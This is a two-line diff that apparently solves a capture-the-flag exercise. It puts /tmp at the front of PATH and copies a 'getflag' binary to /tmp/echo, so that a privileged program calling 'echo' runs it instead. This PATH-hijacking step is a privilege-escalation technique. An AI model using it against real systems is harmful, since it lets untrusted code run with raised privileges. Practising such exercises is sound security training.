@@ -1,0 +1,2 @@
+PATH=/tmp:$PATH
+cp getflag /tmp/echo
